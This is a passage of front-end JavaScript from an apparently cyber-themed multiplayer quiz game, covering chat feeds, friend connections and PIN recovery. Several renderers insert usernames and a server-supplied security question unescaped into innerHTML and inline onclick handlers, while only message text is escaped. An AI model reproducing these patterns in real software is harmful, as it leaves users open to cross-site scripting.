    if (data.success && data.messages) {
      renderGlobalCommsFeed(data.messages, isSilent);
    }
  } catch (e) {}
}

function renderGlobalCommsFeed(messages, isSilent = false) {
  const container = document.getElementById('globalCommsFeed');
  if (!container) return;

  if (messages.length === 0) {
    container.innerHTML = '<div class="text-slate-500 text-center py-8">No broadcasts yet. Be the first to post!</div>';
    return;
  }

  container.innerHTML = messages.map(m => {
    const isMe = m.sender.toLowerCase() === state.account.username.toLowerCase();
    const genderTag = m.gender === 'female' ? '<span class="text-pink-400 font-bold">♀️</span>' : '<span class="text-cyan-400 font-bold">♂️</span>';
    const timeStr = new Date(m.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

    return `
      <div class="flex items-start gap-2.5 ${isMe ? 'flex-row-reverse text-right' : 'text-left'}">
        <div onclick="openDossierModal('${m.sender}')" class="cursor-pointer w-7 h-7 rounded-full overflow-hidden flex-shrink-0 bg-slate-900 border border-slate-700 flex items-center justify-center text-xs shadow">
          ${renderAvatarHTML(m.avatar, "w-full h-full")}
        </div>
        <div class="max-w-[80%]">
          <div class="text-[10px] text-slate-500 space-x-1.5 mb-0.5">
            <span onclick="openDossierModal('${m.sender}')" class="font-bold cursor-pointer hover:underline ${isMe ? 'text-cyan-300' : 'text-slate-300'}">${m.sender}</span>
            <span>${genderTag}</span>
            <span class="text-[9px] text-slate-600">${timeStr}</span>
          </div>
          <div class="inline-block p-2.5 rounded-xl text-xs leading-relaxed ${isMe ? 'bg-cyan-500/20 border border-cyan-500/40 text-cyan-200' : 'bg-slate-900 border border-slate-800 text-slate-200'}">
            ${escapeHtml(m.text)}
          </div>
        </div>
      </div>
    `;
  }).join('');

  if (messages.length !== lastGlobalMsgCount) {
    lastGlobalMsgCount = messages.length;
    container.scrollTop = container.scrollHeight;
  }
}

async function handleSendGlobalComms(e) {
  e.preventDefault();
  sounds.click();
  const input = document.getElementById('globalCommsInput');
  const text = input.value.trim();
  if (!text) return;

  input.value = '';

  try {
    const res = await fetch(API_BASE + '/api/cyber/comms/global', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sender: state.account.username,
        avatar: state.account.avatar,
        gender: state.account.gender,
        text
      })
    });
    const data = await res.json();
    if (data.success && data.message) {
      sounds.correct();
      refreshGlobalComms();
    } else {
      alert(data.error || 'Failed to broadcast message.');
    }
  } catch (err) {
    alert('Network error broadcasting comms.');
  }
}

function sendQuickGlobalChip(phrase) {
  document.getElementById('globalCommsInput').value = phrase;
  handleSendGlobalComms(new Event('submit'));
}

// Direct 1v1 Encrypted Comms
let lastDirectMsgCount = 0;
async function openDirectChatWithUser(recipientUsername) {
  if (!recipientUsername) return;
  sounds.click();
  state.comms.directRecipient = recipientUsername;

  // Fetch recipient public profile for header
  try {
    const res = await fetch(API_BASE + '/api/cyber/profile/' + encodeURIComponent(recipientUsername));
    if (res.ok) {
      const data = await res.json();
      if (data.success && data.profile) {
        const p = data.profile;
        document.getElementById('directChatRecipientAvatar').innerHTML = renderAvatarHTML(p.avatar, "w-full h-full");
        document.getElementById('directChatRecipientName').textContent = p.username;
        const genEl = document.getElementById('directChatRecipientGender');
        if (genEl) genEl.innerHTML = p.gender === 'female' ? '♀️' : '♂️';
        document.getElementById('directChatRecipientRank').textContent = `${p.rank} • ${p.trophies} 🏆`;
      }
    }
  } catch (e) {}

  switchCommsChannel('direct');
  refreshDirectComms(recipientUsername);
}

async function refreshDirectComms(recipientUsername, isSilent = false) {
  if (!recipientUsername) return;
  try {
    const res = await fetch(API_BASE + `/api/cyber/comms/direct/${encodeURIComponent(state.account.username)}/${encodeURIComponent(recipientUsername)}`);
    if (!res.ok) return;
    const data = await res.json();
    if (data.success && data.messages) {
      renderDirectCommsFeed(data.messages, recipientUsername, isSilent);
    }
  } catch (e) {}
}

function renderDirectCommsFeed(messages, recipientUsername, isSilent = false) {
  const container = document.getElementById('directCommsFeed');
  if (!container) return;

  if (messages.length === 0) {
    container.innerHTML = `<div class="text-slate-500 text-center py-8">Encrypted channel established with <strong>${recipientUsername}</strong>. Send a message to start the conversation!</div>`;
    return;
  }

  container.innerHTML = messages.map(m => {
    const isMe = m.sender.toLowerCase() === state.account.username.toLowerCase();
    const timeStr = new Date(m.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

    return `
      <div class="flex items-start gap-2.5 ${isMe ? 'flex-row-reverse text-right' : 'text-left'}">
        <div class="w-7 h-7 rounded-full overflow-hidden flex-shrink-0 bg-slate-900 border border-slate-700 flex items-center justify-center text-xs shadow">
          ${renderAvatarHTML(m.avatar, "w-full h-full")}
        </div>
        <div class="max-w-[80%]">
          <div class="text-[10px] text-slate-500 space-x-1.5 mb-0.5">
            <span class="font-bold ${isMe ? 'text-purple-300' : 'text-slate-300'}">${m.sender}</span>
            <span class="text-[9px] text-slate-600">${timeStr}</span>
          </div>
          <div class="inline-block p-2.5 rounded-xl text-xs leading-relaxed ${isMe ? 'bg-purple-500/25 border border-purple-500/40 text-purple-200' : 'bg-slate-900 border border-slate-800 text-slate-200'}">
            ${escapeHtml(m.text)}
          </div>
        </div>
      </div>
    `;
  }).join('');

  if (messages.length !== lastDirectMsgCount) {
    lastDirectMsgCount = messages.length;
    container.scrollTop = container.scrollHeight;
  }
}

async function handleSendDirectComms(e) {
  e.preventDefault();
  sounds.click();
  if (!state.comms.directRecipient) {
    alert('Please select a recipient operative first.');
    return;
  }

  const input = document.getElementById('directCommsInput');
  const text = input.value.trim();
  if (!text) return;

  input.value = '';

  try {
    const res = await fetch(API_BASE + '/api/cyber/comms/direct', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sender: state.account.username,
        recipient: state.comms.directRecipient,
        avatar: state.account.avatar,
        gender: state.account.gender,
        text
      })
    });
    const data = await res.json();
    if (data.success && data.message) {
      sounds.correct();
      refreshDirectComms(state.comms.directRecipient);
    } else {
      alert(data.error || 'Failed to deliver message.');
    }
  } catch (err) {
    alert('Network error sending encrypted message.');
  }
}

function challengeDirectChatUser() {
  if (!state.comms.directRecipient) return;
  sounds.click();
  switchMainTab('battle');
  startQuickMatch();
}

// Connections (Friend / Alliance Network)
async function refreshConnectionsList() {
  if (!state.account.username || state.account.username.startsWith('Guest_')) return;
  try {
    const res = await fetch(API_BASE + '/api/cyber/connections/' + encodeURIComponent(state.account.username));
    if (!res.ok) return;
    const data = await res.json();
    if (data.success && data.connections) {
      renderConnectionsGrid(data.connections);
      const countBadge = document.getElementById('commsFriendsBadgeCount');
      if (countBadge) countBadge.textContent = data.connections.length;
    }
  } catch (e) {}
}

function renderConnectionsGrid(connections) {
  const grid = document.getElementById('connectionsGrid');
  if (!grid) return;

  if (connections.length === 0) {
    grid.innerHTML = '<div class="text-slate-500 text-center col-span-full py-8 font-mono-cyber text-xs">No operatives connected yet. Use Search or Leaderboard to add friends!</div>';
    return;
  }

  grid.innerHTML = connections.map(c => `
    <div class="glass-card p-4 border-slate-800 space-y-3 font-mono-cyber text-xs hover:border-cyan-500/40 transition-all">
      <div class="flex items-center gap-3">
        <div class="w-10 h-10 rounded-full border border-cyan-400 overflow-hidden flex items-center justify-center bg-slate-900 text-lg">
          ${renderAvatarHTML(c.avatar, "w-full h-full")}
        </div>
        <div>
          <div class="flex items-center gap-1.5">
            <span class="font-bold text-white">${c.username}</span>
            ${renderGenderBadge(c.gender)}
          </div>
          <div class="text-[10px] text-cyan-400">${c.rank}</div>
          <div class="text-[10px] text-slate-500">${c.division} • ${c.trophies} 🏆</div>
        </div>
      </div>

      <div class="grid grid-cols-2 gap-2 pt-1">
        <button onclick="openDirectChatWithUser('${c.username}')" class="py-1.5 rounded-lg bg-purple-500/20 border border-purple-500/40 text-purple-300 font-bold hover:bg-purple-500/30 text-[11px] flex items-center justify-center gap-1">
          <span>💬</span> <span>Chat</span>
        </button>
        <button onclick="toggleConnectionWithUser('${c.username}')" class="py-1.5 rounded-lg bg-slate-800 border border-slate-700 text-slate-400 hover:text-rose-400 text-[11px] flex items-center justify-center gap-1">
          <span>✕</span> <span>Remove</span>
        </button>
      </div>
    </div>
  `).join('');
}

async function toggleConnectionWithUser(targetUsername) {
  if (!state.account.username || state.account.username.startsWith('Guest_')) {
    alert('Please register or login first to connect with other operatives.');
    openAuthModal();
    return;
  }

  sounds.click();
  try {
    const res = await fetch(API_BASE + '/api/cyber/connections/toggle', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: state.account.username,
        targetUsername
      })
    });
    const data = await res.json();
    if (data.success) {
      sounds.correct();
      refreshConnectionsList();
      if (dossierCurrentPlayer && dossierCurrentPlayer.username.toLowerCase() === targetUsername.toLowerCase()) {
        updateDossierConnectBtn(data.isConnected);
      }
      alert(data.isConnected ? `🤝 Connected with Operative ${targetUsername}!` : `Disconnected from ${targetUsername}.`);
    }
  } catch (e) {
    alert('Failed to update connection.');
  }
}

function updateDossierConnectBtn(isConnected) {
  const btn = document.getElementById('dossierConnectBtn');
  const txt = document.getElementById('dossierConnectBtnText');
  if (!btn || !txt) return;

  if (isConnected) {
    btn.className = 'py-2.5 rounded-xl bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 font-bold text-xs flex items-center justify-center gap-1.5';
    txt.textContent = '✓ Connected';
  } else {
    btn.className = 'py-2.5 rounded-xl bg-cyan-500/20 border border-cyan-500/40 text-cyan-300 font-bold text-xs hover:bg-cyan-500/30 transition-all flex items-center justify-center gap-1.5';
    txt.textContent = 'Connect / Friend';
  }
}

function toggleDossierConnection() {
  if (!dossierCurrentPlayer) return;
  toggleConnectionWithUser(dossierCurrentPlayer.username);
}

function openDirectCommsFromDossier() {
  if (!dossierCurrentPlayer) return;
  closeDossierModal();
  switchMainTab('comms');
  openDirectChatWithUser(dossierCurrentPlayer.username);
}

// ==========================================
// 🔐 PASSWORD & PIN RECOVERY ENGINE
// ==========================================

function selectRecoveryMethod(method) {
  sounds.click();
  state.recoveryMethod = method;
  const isKey = method === 'key';

  const btnKey = document.getElementById('recMethodKeyBtn');
  const btnQ = document.getElementById('recMethodQuestionBtn');

  if (btnKey) btnKey.className = isKey ? 'p-2 rounded-lg border-2 border-cyan-400 bg-cyan-500/20 text-cyan-300 font-bold' : 'p-2 rounded-lg border border-slate-700 bg-slate-900 text-slate-400 font-bold';
  if (btnQ) btnQ.className = !isKey ? 'p-2 rounded-lg border-2 border-cyan-400 bg-cyan-500/20 text-cyan-300 font-bold' : 'p-2 rounded-lg border border-slate-700 bg-slate-900 text-slate-400 font-bold';

  document.getElementById('recKeyInputBox').classList.toggle('hidden', !isKey);
  document.getElementById('recQuestionInputBox').classList.toggle('hidden', isKey);
}

async function fetchRecoveryQuestion() {
  sounds.click();
  const username = document.getElementById('recoverUsernameInput').value.trim();
  if (!username) {
    alert('Please enter your Call Sign (username) first.');
    return;
  }

  try {
    const res = await fetch(API_BASE + '/api/cyber/auth/security-question/' + encodeURIComponent(username));
    const data = await res.json();
    if (data.success && data.securityQuestion) {
      document.getElementById('recQuestionLabel').innerHTML = `<strong>প্রশ্ন:</strong> ${data.securityQuestion}`;
      alert(`সিকিউরিটি প্রশ্ন লোড হয়েছে: "${data.securityQuestion}"`);
      selectRecoveryMethod('question');
    } else {
      alert(data.error || 'Username not found.');
    }
  } catch (e) {
    alert('Failed to fetch security question.');
  }
}

async function handleRecoverySubmit(e) {
  e.preventDefault();
  sounds.click();
  const username = document.getElementById('recoverUsernameInput').value.trim();
  const newPin = document.getElementById('recoverNewPinInput').value.trim();
  const recoveryKey = document.getElementById('recoverKeyInput').value.trim();
  const securityAnswer = document.getElementById('recoverSecAnswerInput').value.trim();

  if (!username || !newPin) {
    alert('Username and new PIN are required.');
    return;
  }

  try {
    const res = await fetch(API_BASE + '/api/cyber/auth/recover', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username,
        newPin,
        recoveryKey,
        securityAnswer
      })
    });
    const data = await res.json();
    if (data.success) {
      sounds.victory();
      triggerConfetti();
      alert(data.message || 'PIN successfully reset!');
      switchAuthTab('login');
      document.getElementById('loginUsernameInput').value = username;
      document.getElementById('loginPinInput').value = newPin;
    } else {
      alert(data.error || 'Recovery failed. Invalid Key or Answer.');
    }
  } catch (err) {
    alert('Network error attempting recovery.');
  }
}

function showRecoveryKeyModal(key) {
  document.getElementById('displayedRecoveryKeyText').textContent = key;
  document.getElementById('recoveryKeyModal').classList.remove('hidden');
}

function closeRecoveryKeyModal() {
  document.getElementById('recoveryKeyModal').classList.add('hidden');
}

function copyRecoveryKey() {
  const key = document.getElementById('displayedRecoveryKeyText').textContent;
  if (navigator.clipboard) {
    navigator.clipboard.writeText(key);
    alert('📋 Recovery key copied to clipboard! Keep it safe.');
  }
}


// Explicit Window Exports for 100% Reliable HTML onclick Binding
if (typeof window !== 'undefined') {
  window.toggleAudio = toggleAudio;
  window.openProfileTab = openProfileTab;
  window.switchMainTab = switchMainTab;
  window.instantUnlockCombatLicense = instantUnlockCombatLicense;
  window.startQuickMatch = startQuickMatch;
  window.createPrivateRoom = createPrivateRoom;
  window.joinPrivateRoom = joinPrivateRoom;
  window.sendQuickTaunt = sendQuickTaunt;
  window.handleSendBattleChat = handleSendBattleChat;
  window.submitCombatMove = submitCombatMove;
  window.returnToArenaLobby = returnToArenaLobby;
  window.openAuthModal = openAuthModal;
  window.closeAuthModal = closeAuthModal;
  window.continueAsGuest = continueAsGuest;
  window.switchAuthTab = switchAuthTab;
  window.selectAuthGender = selectAuthGender;
  window.handleAuthPhotoUploaded = handleAuthPhotoUploaded;
  window.chooseAuthAvatar = chooseAuthAvatar;
  window.handleRegisterSubmit = handleRegisterSubmit;
  window.handleLoginSubmit = handleLoginSubmit;
  window.triggerProfilePhotoPicker = triggerProfilePhotoPicker;
  window.handleProfilePhotoSelected = handleProfilePhotoSelected;
  window.toggleUserGender = toggleUserGender;
  window.handlePlayerSearch = handlePlayerSearch;
  window.openDossierModal = openDossierModal;
  window.closeDossierModal = closeDossierModal;
  window.challengeDossierPlayer = challengeDossierPlayer;
  window.toggleLeaderboardType = toggleLeaderboardType;
  window.fetchTrophyLeaderboard = fetchTrophyLeaderboard;
  window.generateHackerBadge = generateHackerBadge;
  window.closeBadgeModal = closeBadgeModal;
  window.downloadIdBadge = downloadIdBadge;
  window.shareIdBadge = shareIdBadge;
  window.openTrainingMission = openTrainingMission;
  window.closeTrainingModal = closeTrainingModal;
  window.submitTrainingAnswer = submitTrainingAnswer;
  window.useTrainingHint = useTrainingHint;
  window.proceedNextTrainingNode = proceedNextTrainingNode;
  window.switchCommsChannel = switchCommsChannel;
  window.refreshGlobalComms = refreshGlobalComms;
  window.handleSendGlobalComms = handleSendGlobalComms;
  window.sendQuickGlobalChip = sendQuickGlobalChip;
  window.openDirectChatWithUser = openDirectChatWithUser;
  window.handleSendDirectComms = handleSendDirectComms;
  window.challengeDirectChatUser = challengeDirectChatUser;
  window.refreshConnectionsList = refreshConnectionsList;
  window.toggleConnectionWithUser = toggleConnectionWithUser;
  window.toggleDossierConnection = toggleDossierConnection;
  window.openDirectCommsFromDossier = openDirectCommsFromDossier;
  window.selectRecoveryMethod = selectRecoveryMethod;
  window.fetchRecoveryQuestion = fetchRecoveryQuestion;
  window.handleRecoverySubmit = handleRecoverySubmit;
  window.showRecoveryKeyModal = showRecoveryKeyModal;
  window.closeRecoveryKeyModal = closeRecoveryKeyModal;
  window.copyRecoveryKey = copyRecoveryKey;

}
